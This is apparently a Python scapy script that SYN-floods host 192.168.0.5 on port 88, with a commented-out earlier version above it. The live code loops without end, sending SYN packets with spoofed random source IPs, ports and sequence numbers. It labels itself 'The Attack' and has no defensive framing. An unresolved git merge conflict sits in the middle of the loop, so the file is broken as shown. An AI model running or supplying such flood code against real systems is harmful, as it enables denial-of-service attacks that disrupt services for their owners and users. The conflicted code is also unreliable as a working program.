# from scapy.all import IP, TCP, send, sr1

# # Target IP and Port
# target_ip = "192.168.0.5"
# target_port = 88

# # Create IP layer
# ip = IP(dst=target_ip)

# # Create TCP SYN packet
# tcp = TCP(dport=target_port, flags='S', sport=12345, seq=1000)


# for i in range(100000):
#     # Send the packet
#     packet = ip / tcp
#     send(packet)
# # Send the SYN and wait for a SYN-ACK
# response = sr1(packet, timeout=2, verbose=False)

# # Analyze response
# if response:
#     if response.haslayer(TCP) and response.getlayer(TCP).flags == 0x12:
#         print("[+] SYN-ACK received!")
#         print(f"    Source Port: {response[TCP].sport}")
#         print(f"    Sequence Number: {response[TCP].seq}")
#     else:
#         print("[-] Received packet, but not SYN-ACK.")
# else:
#     print("[-] No response received.")

from scapy.all import IP, TCP, send
import random

# Target IP and Port
target_ip = "192.168.0.5"
target_port = 88

# --- The Attack ---
print(f"Flooding {target_ip}:{target_port} with SYN packets. Press Ctrl+C to stop.")

try:
    while True:
        # --- Create a randomized packet for each iteration ---

        # 1. Spoof the source IP address (requires root/admin privileges)
        # This makes the target send SYN-ACKs to random, non-existent hosts.
        spoofed_ip = f"10.0.{random.randint(1, 254)}.{random.randint(1, 254)}"

<<<<<<< Updated upstream
for i in range(100):
    # Send the packet
    packet = ip / tcp
    send(packet)
# Send the SYN and wait for a SYN-ACK
response = sr1(packet, timeout=2, verbose=False)
=======
        # 2. Randomize the source port for each packet
        source_port = random.randint(1024, 65535)
>>>>>>> Stashed changes

        # 3. Randomize the TCP sequence number
        sequence_num = random.randint(0, 4294967295)

        # Create the IP and TCP layers
        ip = IP(src=spoofed_ip, dst=target_ip)
        tcp = TCP(sport=source_port, dport=target_port, flags='S', seq=sequence_num)

        # Construct and send the packet
        packet = ip / tcp

        # Send the packet without waiting for a response.
        # verbose=0 suppresses console output for each packet sent, increasing speed.
        send(packet, verbose=0)

except KeyboardInterrupt:
    print("\n[+] Attack stopped by user.")
except Exception as e:
    print(f"[-] An error occurred: {e}")